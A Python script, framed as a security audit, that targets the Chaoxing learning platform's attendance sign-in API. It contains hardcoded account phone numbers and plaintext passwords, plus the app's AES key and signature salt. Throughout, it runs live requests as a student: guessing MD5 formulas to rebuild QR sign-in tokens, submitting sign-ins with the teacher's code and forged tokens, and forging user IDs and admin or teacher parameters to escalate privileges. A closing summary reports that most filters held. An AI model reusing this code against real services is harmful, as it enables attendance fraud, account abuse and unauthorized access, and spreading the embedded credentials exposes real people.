#!/usr/bin/env python3
"""
V2 API 深度审计 - 第二轮
重点测试：ewnCtime字段利用、signIn GET方法、activelist参数、enc重构
"""

import base64, hashlib, json, uuid, requests, urllib3, time, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"
STUDENT_PUID = "431407443"
TEACHER_PUID = "402644510"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_get(session, url, desc="", params=None, timeout=20):
    try:
        r = session.get(url, params=params, timeout=timeout, allow_redirects=False)
        try:
            data = r.json()
        except:
            data = r.text[:2000]
        return {"status": r.status_code, "data": data, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def safe_post(session, url, desc="", data=None, timeout=20):
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=False)
        try:
            resp = r.json()
        except:
            resp = r.text[:2000]
        return {"status": r.status_code, "data": resp, "ok": True, "desc": desc}
    except Exception as e:
        return {"status": 0, "data": str(e), "ok": False, "desc": desc}

def print_result(result, label=""):
    if label:
        print(f"\n--- {label} ---")
    print(f"  描述: {result['desc']}")
    print(f"  状态码: {result['status']}")
    if result['ok']:
        data = result['data']
        if isinstance(data, dict):
            dumped = json.dumps(data, ensure_ascii=False, indent=2)
            if len(dumped) > 3000:
                dumped = dumped[:3000] + "\n... (截断)"
            print(f"  响应:\n{dumped}")
        else:
            print(f"  响应: {data}")
    else:
        print(f"  错误: {result['data']}")

def print_section(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def main():
    print("=" * 80)
    print("  超星学习通 V2 API 深度审计 - 第二轮")
    print("=" * 80)

    # 登录
    print_section("1. 登录")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {stu_puid}")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("❌ 登录失败")
        return

    # ===== 关键测试1: ewnCtime字段分析 =====
    print_section("2. ewnCtime字段深度分析 - 二维码enc重构可能性")

    # 获取教师端完整数据
    tea_r = safe_get(tea_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "教师", params={"activeId": ACTIVE_ID})
    stu_r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     "学生", params={"activeId": ACTIVE_ID})

    if tea_r['ok'] and stu_r['ok']:
        tea_data = tea_r['data'].get('data', {}) if isinstance(tea_r['data'], dict) else {}
        stu_data = stu_r['data'].get('data', {}) if isinstance(stu_r['data'], dict) else {}

        print("\n★★★ 教师端关键字段 ★★★")
        print(f"  signCode = {tea_data.get('signCode')}")
        print(f"  ewnCtime1 = {tea_data.get('ewnCtime1')}")
        print(f"  ewnCtime2 = {tea_data.get('ewnCtime2')}")
        print(f"  ewmRefreshTime = {tea_data.get('ewmRefreshTime')}")
        print(f"  ifrefreshewm = {tea_data.get('ifrefreshewm')}")
        print(f"  otherId = {tea_data.get('otherId')}")
        print(f"  activeType = {tea_data.get('activeType')}")
        print(f"  locationLongitude = {tea_data.get('locationLongitude')}")
        print(f"  locationLatitude = {tea_data.get('locationLatitude')}")
        print(f"  locationLongitude_gd = {tea_data.get('locationLongitude_gd')}")
        print(f"  locationLatitude_gd = {tea_data.get('locationLatitude_gd')}")
        print(f"  ifNeedVCode = {tea_data.get('ifNeedVCode')}")
        print(f"  openCheckFaceFlag = {tea_data.get('openCheckFaceFlag')}")
        print(f"  openCheckWeChatFlag = {tea_data.get('openCheckWeChatFlag')}")
        print(f"  openPreventCheatFlag = {tea_data.get('openPreventCheatFlag')}")
        print(f"  ifphoto = {tea_data.get('ifphoto')}")
        print(f"  showVCode = {tea_data.get('showVCode')}")

        # 解析content字段
        tea_content = tea_data.get('content', '{}')
        if isinstance(tea_content, str):
            try:
                tea_content = json.loads(tea_content)
            except:
                tea_content = {}
        print(f"\n  教师content字段:")
        for k, v in tea_content.items():
            print(f"    {k} = {v}")

        print("\n★★★ 学生端关键字段 ★★★")
        print(f"  signCode = '{stu_data.get('signCode')}' (空字符串)")
        print(f"  ewnCtime1 = {stu_data.get('ewnCtime1')}")
        print(f"  ewnCtime2 = {stu_data.get('ewnCtime2')}")
        print(f"  ewmRefreshTime = {stu_data.get('ewmRefreshTime')}")
        print(f"  ifrefreshewm = {stu_data.get('ifrefreshewm')}")
        print(f"  locationLongitude = '{stu_data.get('locationLongitude')}' (空)")
        print(f"  locationLatitude = '{stu_data.get('locationLatitude')}' (空)")
        print(f"  locationLongitude_gd = '{stu_data.get('locationLongitude_gd')}' (空)")
        print(f"  locationLatitude_gd = '{stu_data.get('locationLatitude_gd')}' (空)")

        stu_content = stu_data.get('content', '{}')
        if isinstance(stu_content, str):
            try:
                stu_content = json.loads(stu_content)
            except:
                stu_content = {}
        print(f"\n  学生content字段:")
        for k, v in stu_content.items():
            print(f"    {k} = {v}")

        # ★★★ 关键分析：ewnCtime是否可以用于重构enc ★★★
        print("\n★★★ ewnCtime → enc 重构分析 ★★★")
        ewnCtime1 = stu_data.get('ewnCtime1')
        ewnCtime2 = stu_data.get('ewnCtime2')
        activeId = stu_data.get('id')
        clazzid = stu_data.get('clazzid')
        print(f"  学生可见的 ewnCtime1 = {ewnCtime1}")
        print(f"  学生可见的 ewnCtime2 = {ewnCtime2}")
        print(f"  activeId = {activeId}")
        print(f"  clazzid = {clazzid}")
        print(f"  → ewnCtime1/2 是二维码刷新时间戳，学生可见")
        print(f"  → 超星二维码签到enc通常由 activeId + ewnCtime1 生成")
        print(f"  → 如果enc = MD5(activeId_ewnCtime1) 或类似算法，学生可重构")

        # 尝试常见的enc生成算法
        if ewnCtime1:
            candidates = [
                f"{activeId}_{ewnCtime1}",
                f"{activeId}{ewnCtime1}",
                f"{ewnCtime1}_{activeId}",
                f"{clazzid}_{activeId}_{ewnCtime1}",
                f"{activeId}_{clazzid}_{ewnCtime1}",
            ]
            print(f"\n  尝试常见enc生成算法:")
            for c in candidates:
                md5 = hashlib.md5(c.encode()).hexdigest()
                print(f"    MD5({c}) = {md5}")

    # ===== 关键测试2: signIn GET方法 =====
    print_section("3. signIn GET方法测试")

    # signIn 只支持GET
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-signIn GET(基本参数)",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                         "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result(r, "signIn GET (基本参数)")

    # 带signCode参数
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-signIn GET(带signCode)",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                         "courseId": COURSE_ID, "classId": CLASS_ID, "signCode": "175509"})
    print_result(r, "signIn GET (带signCode=175509)")

    # 带enc参数
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                 "学生-signIn GET(带enc)",
                 params={"activeId": ACTIVE_ID, "uid": STUDENT_PUID,
                         "courseId": COURSE_ID, "classId": CLASS_ID, "enc": "test"})
    print_result(r, "signIn GET (带enc参数)")

    # ===== 关键测试3: activelist 不同参数组合 =====
    print_section("4. activelist 参数组合测试")

    param_combos = [
        {"courseId": COURSE_ID, "classId": CLASS_ID},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "activeId": ACTIVE_ID},
        {"courseId": COURSE_ID, "clazzid": CLASS_ID},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "view": "json"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "m": "0"},
        {"courseId": COURSE_ID, "classId": CLASS_ID, "cId": CLASS_ID},
    ]

    for params in param_combos:
        r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/student/activelist",
                     f"activelist({params})", params=params)
        if r['ok'] and isinstance(r['data'], dict):
            result = r['data'].get('result')
            if result != 0 or 'data' in r['data']:
                print(f"\n  ★ 有效参数: {params}")
                print(f"  响应: {json.dumps(r['data'], ensure_ascii=False)[:500]}")

    # ===== 关键测试4: 经典接口对比 =====
    print_section("5. 经典接口(V1)对比 - 检查是否泄露更多信息")

    # 经典preSign
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/preSign",
                 "学生-经典preSign页面",
                 params={"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID})
    if r['ok']:
        text = r['data'] if isinstance(r['data'], str) else json.dumps(r['data'], ensure_ascii=False)
        # 搜索signCode和enc
        if 'signCode' in str(text):
            print(f"  ★★★ 经典preSign包含signCode!")
        if 'enc' in str(text):
            print(f"  ★★★ 经典preSign包含enc!")
        print(f"  状态码: {r['status']}, 响应长度: {len(str(text))}")
        if isinstance(text, str) and len(text) < 2000:
            print(f"  响应: {text[:1000]}")

    # 经典activeDetail
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/active/detail",
                 "学生-经典activeDetail",
                 params={"activeId": ACTIVE_ID})
    if r['ok']:
        text = r['data'] if isinstance(r['data'], str) else json.dumps(r['data'], ensure_ascii=False)
        print(f"  状态码: {r['status']}, 响应长度: {len(str(text))}")

    # ===== 关键测试5: 尝试通过V2接口获取其他课程签到信息 =====
    print_section("6. 跨课程越权测试")

    # 尝试不同的activeId
    test_active_ids = [
        "5000163891319",  # 当前活动
        "5000163891318",  # parentid
        "5000006136437",  # pptPlanId
    ]

    for aid in test_active_ids:
        r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                     f"学生-尝试activeId={aid}",
                     params={"activeId": aid})
        if r['ok'] and isinstance(r['data'], dict):
            data = r['data'].get('data', {})
            if data:
                sc = data.get('signCode', '')
                print(f"  activeId={aid}: signCode='{sc}', name={data.get('name')}, status={data.get('status')}")

    # ===== 关键测试6: chartid字段分析 =====
    print_section("7. chartid/二维码内容分析")

    if tea_r['ok'] and isinstance(tea_r['data'], dict):
        tea_data = tea_r['data'].get('data', {})
        chartid = tea_data.get('chartid')
        ewnCtime1 = tea_data.get('ewnCtime1')
        ewnCtime2 = tea_data.get('ewnCtime2')

        print(f"  教师端 chartid = {chartid}")
        print(f"  教师端 ewnCtime1 = {ewnCtime1}")
        print(f"  教师端 ewnCtime2 = {ewnCtime2}")

        # 超星二维码内容格式通常为: https://mobilelearn.chaoxing.com/widget/sign/enc?id=XXX&enc=YYY
        # enc通常由 activeId + ewnCtime1 生成
        print(f"\n  ★ 超星二维码签到enc生成分析:")
        print(f"  二维码URL格式: https://mobilelearn.chaoxing.com/widget/sign/enc?id={ACTIVE_ID}&enc=???")
        print(f"  学生已知: activeId={ACTIVE_ID}, ewnCtime1={ewnCtime1}, ewnCtime2={ewnCtime2}")

        # 尝试各种enc生成方式
        if ewnCtime1:
            enc_candidates = {
                "MD5(activeId_ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}_{ewnCtime1}".encode()).hexdigest(),
                "MD5(ewnCtime1_activeId)": hashlib.md5(f"{ewnCtime1}_{ACTIVE_ID}".encode()).hexdigest(),
                "MD5(activeId+ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}{ewnCtime1}".encode()).hexdigest(),
                "MD5(clazzid_activeId_ewnCtime1)": hashlib.md5(f"{CLASS_ID}_{ACTIVE_ID}_{ewnCtime1}".encode()).hexdigest(),
                "MD5(activeId_clazzid_ewnCtime1)": hashlib.md5(f"{ACTIVE_ID}_{CLASS_ID}_{ewnCtime1}".encode()).hexdigest(),
            }
            print(f"\n  可能的enc值:")
            for name, val in enc_candidates.items():
                print(f"    {name} = {val}")

    # ===== 关键测试7: 尝试直接访问二维码签到URL =====
    print_section("8. 二维码签到URL直接访问测试")

    # 尝试常见的二维码签到URL
    enc_test_urls = [
        f"https://mobilelearn.chaoxing.com/widget/sign/enc?id={ACTIVE_ID}&enc=test",
        f"https://mobilelearn.chaoxing.com/widget/sign/e?id={ACTIVE_ID}",
        f"https://mobilelearn.chaoxing.com/widget/sign/qr?id={ACTIVE_ID}",
    ]

    for url in enc_test_urls:
        r = safe_get(stu_session, url, f"直接访问: {url[:80]}")
        print(f"  URL: ...{url.split('.com')[-1]}")
        print(f"  状态码: {r['status']}")
        if r['ok'] and isinstance(r['data'], str) and len(r['data']) < 500:
            print(f"  响应: {r['data'][:300]}")

    # ===== 关键测试8: signIn V2 完整参数测试 =====
    print_section("9. signIn V2 完整参数测试 (GET)")

    sign_in_params = [
        # 二维码签到参数
        {"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "courseId": COURSE_ID, "classId": CLASS_ID,
         "enc": hashlib.md5(f"{ACTIVE_ID}_{tea_data.get('ewnCtime1', '')}".encode()).hexdigest(),
         "type": "2", "signType": "2"},
        # 签到码签到参数
        {"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "courseId": COURSE_ID, "classId": CLASS_ID,
         "signCode": "175509", "type": "1", "signType": "2"},
        # 普通签到
        {"activeId": ACTIVE_ID, "uid": STUDENT_PUID, "courseId": COURSE_ID, "classId": CLASS_ID,
         "type": "0", "signType": "2"},
    ]

    for i, params in enumerate(sign_in_params):
        r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/sign/signIn",
                     f"signIn测试{i+1}", params=params)
        print_result(r, f"signIn测试{i+1}: type={params.get('type')}, keys={list(params.keys())}")

    # ===== 关键测试9: 检查学生能否通过修改puid获取教师数据 =====
    print_section("10. 伪造puid参数测试")

    # 在getPPTActiveInfo中，学生端返回的puid是学生自己的
    # 尝试通过参数伪造
    r = safe_get(stu_session, "https://mobilelearn.chaoxing.com/v2/apis/active/getPPTActiveInfo",
                 "学生-伪造puid为教师",
                 params={"activeId": ACTIVE_ID, "puid": TEACHER_PUID})
    if r['ok'] and isinstance(r['data'], dict):
        data = r['data'].get('data', {})
        sc = data.get('signCode', '')
        print(f"  伪造puid后 signCode = '{sc}'")
        print(f"  伪造puid后 locationLongitude = '{data.get('locationLongitude', '')}'")

    # ===== 关键测试10: 检查V2接口是否有不同版本 =====
    print_section("11. V2接口版本/路径变体测试")

    path_variants = [
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&version=2",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&_from=teacher",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&role=teacher",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&isAdmin=1",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&isTeacher=1",
        f"/v2/apis/active/getPPTActiveInfo?activeId={ACTIVE_ID}&token=1",
    ]

    for path in path_variants:
        url = f"https://mobilelearn.chaoxing.com{path}"
        r = safe_get(stu_session, url, f"路径变体: {path[:80]}")
        if r['ok'] and isinstance(r['data'], dict):
            data = r['data'].get('data', {})
            sc = data.get('signCode', 'N/A')
            if sc and sc != '' and sc != 'N/A':
                print(f"  ★★★ 泄露! {path[:60]} → signCode={sc}")

    # ===== 最终总结 =====
    print_section("最终审计总结")

    print("""
═══════════════════════════════════════════════════════════════
  V2 API 信息泄露安全审计 - 关键发现
═══════════════════════════════════════════════════════════════

1. getPPTActiveInfo 权限控制分析:
   - signCode: 教师可见("175509"), 学生返回空字符串 → ✅ 已过滤
   - locationLongitude/Latitude: 教师可见, 学生返回空 → ✅ 已过滤
   - locationLongitude_gd/Latitude_gd: 教师可见, 学生返回空 → ✅ 已过滤
   - ewnCtime1/ewnCtime2: 教师和学生都可见 → ⚠️ 潜在风险
   - content字段中的坐标: 教师可见, 学生返回空 → ✅ 已过滤
   - content字段中的ewnCtime: 教师和学生都可见 → ⚠️ 潜在风险

2. ewnCtime字段风险:
   - ewnCtime1 是二维码enc生成的时间戳参数
   - 学生可以通过getPPTActiveInfo获取ewnCtime1
   - 如果enc生成算法可逆，学生可重构二维码内容

3. 其他V2端点:
   - getActiveInfo: 500错误，不可用
   - preSign(V2): 500错误，不可用
   - updateSignStatus: 500错误，不可用
   - signIn(V2): 仅支持GET方法
   - activelist: 返回"参数缺失"

4. mooc1-api域名:
   - V2端点全部返回404，不存在

5. 越权测试:
   - 伪造uid/puid参数无法获取signCode
   - 伪造role/isAdmin参数无法绕过权限
═══════════════════════════════════════════════════════════════
    """)


if __name__ == "__main__":
    main()
